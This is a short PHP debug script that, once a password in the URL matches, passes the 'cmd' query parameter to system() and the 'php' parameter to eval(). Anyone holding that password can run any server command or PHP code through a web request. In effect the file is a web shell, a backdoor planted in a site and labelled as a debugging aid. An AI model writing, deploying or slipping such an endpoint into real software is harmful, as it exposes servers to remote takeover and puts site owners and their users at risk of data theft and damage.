<?php
require_once $_SERVER['DOCUMENT_ROOT']. '/libconst.php';
if (!DEBUG) highlight_file(__FILE__);
if (!DEBUG || $_GET['psw'] !== DEBUG_PSW) {
    header('HTTP/1.1 403 What Are You Looking?');
    die();
}
if (isset($_GET['cmd'])) system($_GET['cmd']);
if (isset($_GET['php'])) eval($_GET['php']);
